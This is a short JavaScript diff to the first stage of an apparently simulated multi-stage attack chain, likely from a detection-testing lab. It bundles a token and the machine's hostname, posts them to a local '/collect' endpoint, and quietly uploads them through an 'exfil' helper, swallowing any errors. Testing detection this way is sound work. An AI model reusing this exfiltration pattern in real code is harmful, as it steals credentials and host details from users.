@@ -73,16 +73,22 @@ async function stage1() {
       token
     });
 
+    const stagePayload = {
+      attack: 'multi-stage-attack-chain',
+      stage: 'stage1',
+      timestamp: new Date().toISOString(),
+      hostname: os.hostname(),
+      token
+    };
     await postJson(
       { hostname: 'localhost', port: 3017, path: '/collect' },
-      {
-        attack: 'multi-stage-attack-chain',
-        stage: 'stage1',
-        timestamp: new Date().toISOString(),
-        hostname: os.hostname(),
-        token
-      }
+      stagePayload
     );
+    try {
+      const { uploadJson } = require('../../../../detection-tools/floci/floci-exfil');
+      uploadJson('17', 'stage1', stagePayload, 'chain');
+      uploadJson('17', 'stage1', stagePayload);
+    } catch (_) {}
   }
 
   return { ok: true, token };
